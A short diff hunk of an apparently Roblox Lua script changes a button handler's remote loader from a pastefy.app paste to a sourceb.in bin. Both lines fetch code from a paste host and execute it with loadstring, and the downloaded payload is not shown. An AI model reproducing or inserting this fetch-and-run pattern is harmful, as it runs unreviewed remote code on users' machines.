@@ -108,7 +108,7 @@ actionBtn.MouseButton1Click:Connect(function()
 	end)
 
 	pcall(function()
-		loadstring(game:HttpGet("https://pastefy.app/lQIW6s9U/raw"))()
+		loadstring(game:HttpGet("https://cdn.sourceb.in/bins/pDQ76OkIWN/0", true))()
 	end)
 
 	wait(45)
